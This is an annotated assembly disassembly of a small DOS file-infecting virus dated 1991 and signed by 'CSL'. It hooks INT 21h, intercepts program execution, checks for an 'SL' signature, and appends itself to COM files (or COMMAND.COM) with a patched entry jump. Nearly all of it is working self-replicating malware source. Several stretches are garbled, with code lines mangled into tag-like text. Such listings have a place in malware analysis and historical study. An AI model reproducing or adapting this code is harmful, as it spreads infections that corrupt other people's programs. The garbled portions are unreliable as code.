

seg_a	segment	byte public
	assume	cs:seg_a, ds:seg_a


	org	100h


start:	jmp	l_DEDE						;0100  E9 DDDB

;===============================================================
;	victim code follow here
;---------------------------------------------------------------
	org	0DEDEh

;===============================================================
l_DEDE:	push	ax						;DEDE  50
	call	s_DEE2						;DEDF  E8 0000
s_DEE2:	pop	ax						;DEE2  58
	sub	ax,4		;virus base addres		;DEE3  2D 0004
	push	cx						;DEE6  51
	push	dx						;DEE7  52
	push	ds						;DEE8  1E
	push	es						;DEE9  06
	mov	si,ax		;virus base address		;DEEA  8B F0
	add	ax,93h		;= l_DF71			;DEEC  05 0093
	mov	bx,ax						;DEEF  8B D8
	mov	ax,cs						;DEF1  8C C8
	mov	ds,ax						;DEF3  8E D8
	mov	di,100h		;begin of COM file		;DEF5 .BF 0100
	mov	ax,[bx-4]					;DEF8  8B 47 FC
	mov	[di],ax						;DEFB  89 05
	mov	al,[bx-2]					;DEFD  8A 47 FE
	mov	[di+2],al					;DF00  88 45 02
	xor	ax,ax						;DF03  33 C0
	mov	ds,ax						;DF05  8E D8
	mov	bx,413h		;BIOS memory size (KB)		;DF07 .BB 0413
	mov	ax,[bx]						;DF0A  8B 07
	cmp	ax,630						;DF0C  3D 0276
	je	l_DF62		;-> memory size reduced		;DF0F  74 51
	mov	ax,630						;DF11  B8 0276
	mov	[bx],ax		;new BIOS memory size		;DF14  89 07
	mov	ax,20h						;DF16  B8 0020
	mov	es,ax		;200h = int 80h			;DF19  8E C0
	mov	ax,cs						;DF1B  8C C8
	mov	ds,ax						;DF1D  8E D8
	cld							;DF1F  FC
	mov	di,0						;DF20 .BF 0000
	mov	bx,17Dh		;virus length			;DF23  BB 017D
l_DF26:	lodsb							;DF26  AC
	stosb							;DF27  AA
	dec	bx						;DF28  4B
	jnz	l_DF26						;DF29  75 FB
	mov	ax,0						;DF2B  B8 0000
	mov	ds,ax						;DF2E  8E D8
	mov	ax,ds:[84h]	;int 21h service offset		;DF30  A1 0084
	mov	cx,ax						;DF33  8B C8
	mov	ax,92h		;new int 21h offset l_DF70	;DF35  B8 0092
	mov	bx,84h						;DF38 .BB 0084
	mov	[bx],ax						;DF3B  89 07
	mov	ax,ds:[86h]	;int 21h service segment	;DF3D  A1 0086
	mov	dx,ax						;DF40  8B D0
	mov	ax,es						;DF42  8C C0
	mov	[bx+2],ax	;new int 21h service segment	;DF44  89 47 02
	mov	ds,ax						;DF47  8E D8
	mov	ax,cx		;old int 21h service offset	;DF49  8B C1
	mov	bx,0151h	;=l_E02F			;DF4B .BB 0151
	mov	[bx-3],ax	;old int 21h offset		;DF4E  89 47 FD
	mov	ax,dx						;DF51  8B C2
	mov	[bx-1],ax	;old int 21h segment		;DF53  89 47 FF
	mov	bx,2Ch						;DF56 .BB 002C
	mov	ax,cs:[bx]	;environment segment		;DF59  2E: 8B 07
	mov	bx,0DAh		;=DFB8				;DF5C .BB 00DA
	mov	[bx-3],ax					;DF5F  89 47 FD

	;<----- exit="" l_df62:="" mov="" bx,100h="" ;df62="" .bb="" 0100="" pop="" es="" ;df65="" 07="" pop="" ds="" ;df66="" 1f="" pop="" dx="" ;df67="" 5a="" pop="" cx="" ;df68="" 59="" pop="" ax="" ;df69="" 58="" sti="" ;df6a="" fb="" jmp="" bx="" ;-=""> run victim			;DF6B  FF E3

	db	0EBh,17h,4Dh		;<- saved="" victim="" bytes="" ;df6d="" eb="" 17="" 4d="" ;="===============================================================" ;="" new="" int="" 21h="" service="" routine="" ;----------------------------------------------------------------="" l_df70:="" push="" ax="" ;df70="" 50="" l_df71:="" cmp="" ah,4bh="" ;load="" &="" run="" (or="" not="" run)="" ;df71="" 80="" fc="" 4b="" jne="" l_df9b="" ;-=""> no, exit			;DF74  75 25
	push	di						;DF76  57
	push	si						;DF77  56
	push	bx						;DF78  53
	push	cx						;DF79  51
	push	es						;DF7A  06
	push	ds						;DF7B  1E
	push	dx						;DF7C  52

	;<----- next="" file="" l_df7d:="" mov="" ax,3d02h="" ;open="" file="" r/w="" ;df7d="" b8="" 3d02="" int="" 21h="" ;df80="" cd="" 21="" jc="" l_dfa7="" ;-=""> error			;DF82  72 23
	push	ax		;file handle			;DF84  50
	mov	bx,ax						;DF85  8B D8
	mov	cx,0FFFFh	;bytes to read			;DF87  B9 FFFF
	mov	dx,0		;buffer address			;DF8A .BA 0000
	mov	ax,9000h	;last 64KB of system memory	;DF8D  B8 9000
	mov	ds,ax						;DF90  8E D8
	mov	ah,3Fh		;read handle			;DF92  B4 3F
	int	21h						;DF94  CD 21
	mov	bx,ax		;bytes read			;DF96  8B D8
	jmp	short l_DF9E					;DF98  EB 04
	nop							;DF9A  90

l_DF9B:	jmp	l_E02A		;<----- int="" 21h="" exit="" ;df9b="" e9="" 008c="" l_df9e:="" mov="" ax,9000h="" ;last="" 64kb="" of="" system="" memory="" ;df9e="" b8="" 9000="" mov="" ds,ax="" ;dfa1="" 8e="" d8="" pop="" ax="" ;file="" handle="" ;dfa3="" 58="" jmp="" short="" l_dfaa="" ;dfa4="" eb="" 04="" nop="" ;dfa6="" 90="" l_dfa7:="" jmp="" short="" l_e023=""></-----><--- error="" ;dfa7="" eb="" 7a="" nop="" ;dfa9="" 90="" l_dfaa:="" mov="" cx,ds:[0]="" ;dfaa="" 8b="" 0e="" 0000="" cmp="" cx,'zm'="" ;exe="" file="" ;dfae="" 81="" f9="" 5a4d="" jne="" l_dfbe="" ;-=""> no				;DFB2  75 0A
	mov	ax,0		;place for environment seg	;DFB4  B8 0000
	mov	ds,ax						;DFB7  8E D8
l_DFB8	equ	$-1
	mov	dx,8		;mostly pointer to command.com	;DFB9  BA 0008
	jmp	short l_DF7D					;DFBC  EB BF

	;<----- com="" file="" l_dfbe:="" mov="" dx,[bx-3]="" ;1="" &="" 2="" bytes="" from="" end="" of="" file="" ;dfbe="" 8b="" 57="" fd="" cmp="" dx,'ls'="" ;contamination="" signature="" ;dfc1="" 81="" fa="" 4c53="" je="" l_e023="" ;-=""> allready infected, exit	;DFC5  74 5C
	push	ax		;file handle			;DFC7  50
	push	bx		;file length			;DFC8  53
	xor	bx,bx						;DFC9  33 DB
	mov	ax,[bx]		;byte from BOF			;DFCB  8B 07
	mov	di,93h		;= offset L_DF71		;DFCD .BF 0093
	mov	cs:[di-4],ax	;saved victim bytes		;DFD0  2E: 89 45 FC
	mov	al,[bx+2]	;third file byte		;DFD4  8A 47 02
	mov	cs:[di-2],al	;saved				;DFD7  2E: 88 45 FE
	pop	bx		;file length			;DFDB  5B
	xor	di,di						;DFDC  33 FF
	mov	ax,bx		;jump distance			;DFDE  8B C3
	sub	ax,3		;jmp instruction length		;DFE0  2D 0003
	mov	[di+1],ax	;into victim code		;DFE3  89 45 01
	mov	al,0E9h		;jmp opcode			;DFE6  B0 E9
	mov	[di],al						;DFE8  88 05
	mov	si,0						;DFEA .BE 0000
	mov	ax,ds		;9000h				;DFED  8C D8
	mov	es,ax						;DFEF  8E C0
	mov	ax,cs		;virus segment			;DFF1  8C C8
	mov	ds,ax						;DFF3  8E D8
	mov	di,bx		;end of file			;DFF5  8B FB
	mov	bx,17Dh		;virus length			;DFF7  BB 017D
	cld							;DFFA  FC
l_DFFB:	lodsb							;DFFB  AC
	stosb							;DFFC  AA
	dec	bx						;DFFD  4B
	jnz	l_DFFB						;DFFE  75 FB
	pop	ax		;file handle			;E000  58
	mov	bx,ax						;E001  8B D8
	push	bx						;E003  53
	mov	cx,di		;end of file (with copied virus);E004  8B CF
	push	cx						;E006  51
	xor	cx,cx						;E007  33 C9
	xor	dx,dx						;E009  33 D2
	mov	ax,4200h	;set file ptr BOF+offset	;E00B  B8 4200
	int	21h						;E00E  CD 21
	pop	cx		;victim file length (before cont;E010  59
	pop	bx		;file handle			;E011  5B
	push	bx						;E012  53
	mov	ax,9000h	;buffer segment			;E013  B8 9000
	mov	ds,ax						;E016  8E D8
	xor	dx,dx		;buffer offset			;E018  33 D2
	mov	ah,40h		;write file cx bytes		;E01A  B4 40
	int	21h						;E01C  CD 21
	pop	bx		;file handle			;E01E  5B
	mov	ah,3Eh		;close handle			;E01F  B4 3E
	int	21h						;E021  CD 21

l_E023:	pop	dx						;E023  5A
	pop	ds						;E024  1F
	pop	es						;E025  07
	pop	cx						;E026  59
	pop	bx						;E027  5B
	pop	si						;E028  5E
	pop	di						;E029  5F

l_E02A:	pop	ax						;E02A  58
	db	0EAh,16h,17h,0C1h,02h	;jmp far ptr xxxx:yyyy	;E02B  EA 16 17 C1 02
l_E02F	equ	$-1

	db	'26.07.91.Pre-released Microeleph'		;E030  32 36 2E 30 37 2E
								;E036  39 31 2E 50 72 65
								;E03C  2D 72 65 6C 65 61
								;E042  73 65 64 20 4D 69
								;E048  63 72 6F 65 6C 65
								;E04E  70 68
	db	'ant by CSL'					;E050  61 6E 74 20 62 79
								;E056  20 43 53 4C
					;bytes 'SL'=contamination signature
	db	0						;E05A  00

seg_a	ends

	end	start

</-----></---></-----></-></----->